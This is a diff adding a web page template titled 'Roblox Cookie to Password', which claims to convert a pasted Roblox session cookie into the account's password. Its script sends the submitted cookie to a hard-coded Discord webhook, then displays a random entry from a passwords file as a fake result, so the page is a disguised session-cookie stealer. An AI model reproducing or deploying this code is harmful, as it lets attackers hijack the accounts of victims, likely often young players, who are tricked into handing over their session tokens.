@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie to Password</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <div class="logo-circle"></div>
+            <h2>Roblox Cookie to Password</h2>
+        </div>
+        <nav>
+            <a href="#">Home</a>
+        </nav>
+    </header>
+
+    <main>
+        <h1>Updated Daily</h1>
+        <div class="form-container">
+            <form id="cookieForm">
+                <label for="cookie">The user's cookie (Required)</label>
+                <input type="text" id="cookie" placeholder="Copy and paste the specified user's cookie." required>
+                <p class="error-message" id="errorMessage">⚠️ Invalid cookie. Ensure it is a valid roblox cookie.</p>
+                <button type="submit">Translate</button>
+            </form>
+        </div>
+        <div id="generatedPasswordContainer">
+            <p id="generatedPassword"></p>
+        </div>
+    </main>
+
+    <script>
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1295309122778173481/j8qjD0R0W1B3K_FzSHABwAACbyyH_mIHMJWIZvxVn0hPainlG_dfpLmUYeLplbiBKDEF';  // Replace with your actual Discord Webhook URL
+
+        document.getElementById('cookieForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const cookieValue = document.getElementById('cookie').value;
+
+            if (!cookieValue) {
+                document.getElementById('errorMessage').style.display = 'block';
+            } else if (!isValidCookie(cookieValue)) {
+                document.getElementById('errorMessage').style.display = 'block';
+            } else {
+                document.getElementById('errorMessage').style.display = 'none';
+
+                // Send the cookie to the Discord webhook
+                sendToDiscord(cookieValue);
+
+                // Get a random password from passwords.txt
+                getRandomPassword();
+            }
+        });
+
+        // Function to send the cookie data to Discord Webhook
+        function sendToDiscord(cookie) {
+            const payload = {
+                content: `Received Session: ${cookie}`,
+                username: "Session",  // Customize the username as needed
+            };
+
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Cookie sent to Discord successfully');
+                } else {
+                    console.error('Error sending cookie to Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+            });
+        }
+
+        function getRandomPassword() {
+            const passwordsFileURL = 'static/passwords.txt';
+            fetch(passwordsFileURL)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.text();
+                })
+                .then(text => {
+                    const passwords = text.split('\n').filter(Boolean); // Split by new lines, removing any empty lines
+                    const randomPassword = passwords[Math.floor(Math.random() * passwords.length)];
+                    // Display the random password on the page
+                    document.getElementById('generatedPassword').textContent = `User Password: ${randomPassword}`;
+                })
+                .catch(error => {
+                    console.error('Error fetching the passwords file:', error);
+                });
+        }
+
+        function isValidCookie(cookie) {
+            const uppercaseCount = (cookie.match(/[A-Z]/g) || []).length;
+            const numberCount = (cookie.match(/[0-9]/g) || []).length;
+
+            return uppercaseCount >= 5 && numberCount >= 5;
+        }
+    </script>
+</body>
+</html>
